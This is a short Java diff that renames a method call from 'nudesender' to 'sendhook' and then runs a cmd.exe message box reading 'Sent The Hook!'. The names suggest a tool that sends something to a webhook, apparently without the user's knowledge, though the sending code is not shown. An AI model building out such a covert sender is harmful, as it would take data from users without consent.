@@ -7,7 +7,7 @@ public class Main {
         Default adefault = new Default();
 
         try {
-            adefault.nudesender();
+            adefault.sendhook();
             Thread.sleep(1000);
 
             Runtime.getRuntime().exec("cmd /c start cmd.exe /K \"msg * Sent The Hook! && exit\"");
